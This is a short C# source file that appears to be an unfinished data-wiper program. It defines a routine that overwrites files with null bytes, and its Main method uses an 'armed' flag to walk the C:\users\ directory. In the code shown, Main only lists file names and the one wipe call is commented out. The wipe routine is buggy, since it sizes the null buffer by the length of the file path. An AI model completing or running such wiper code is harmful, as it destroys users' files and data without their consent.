using System.Reflection.Metadata;

namespace emu
{
    public class caddycore
    {
        
        static void wipe(string Filepath)
        {
            Console.WriteLine(Filepath);
            byte[] byteray = nullwrite(Filepath.Length);
            File.WriteAllBytes(Filepath, byteray);
            /*using (Stream stream = File.Open(Filepath, FileMode.Open))
            {
                stream.Position = 0;
                stream.Write(null);
            }*/
        }

        static byte[] nullwrite(int Size)
        {
            byte[] nullbytes = new byte[Size];
            return nullbytes;
        }

        static void Main()
        {
            //string filepath = "C:\\users\\zoe\\Desktop\\test.txt";
            //wipe(filepath);
            int armed = 1;
            if(armed == 0)
            {
                Console.WriteLine("not armed. Exiting...");
            }
            else if(armed == 1) 
            {
                DirectoryInfo directoryinfo = new DirectoryInfo("C:\\users\\");
                foreach(FileInfo file in directoryinfo.GetFiles()) 
                {
                    Console.WriteLine(file.FullName);
                }
            }
        }
    }
}